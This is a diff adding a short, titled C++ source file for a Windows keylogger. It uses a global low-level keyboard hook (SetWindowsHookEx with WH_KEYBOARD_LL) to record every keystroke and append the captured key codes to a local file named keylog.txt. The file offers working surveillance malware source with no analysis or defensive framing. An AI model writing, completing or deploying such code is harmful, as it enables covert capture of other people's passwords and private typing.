@@ -1,0 +1,52 @@
+RK
+Title: Windows Keylogger using WH_KEYBOARD_LL with Ring Buffer and File Flush
+```cpp
+// language: C++, file: keylogger.cpp, target: Windows 10/11, MSVC
+#include <windows.h>
+#include <fstream>
+#include <vector>
+#include <mutex>
+
+std::vector<char> keyBuffer;
+std::mutex bufferMutex;
+const size_t BUFFER_SIZE = 256; // Ring buffer size
+std::ofstream logFile("keylog.txt", std::ios::app);
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT *pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            char key = static_cast<char>(pKeyBoard->vkCode);
+
+            std::lock_guard<std::mutex> lock(bufferMutex);
+            keyBuffer.push_back(key);
+
+            if (keyBuffer.size() >= BUFFER_SIZE) {
+                for (char k : keyBuffer) {
+                    logFile << k;
+                }
+                logFile.flush();
+                keyBuffer.clear();
+            }
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+DWORD WINAPI KeyLoggerThread(LPVOID lpParameter) {
+    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(hhkLowLevelKybd);
+    return 0;
+}
+
+int main() {
+    HANDLE hThread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}
+```
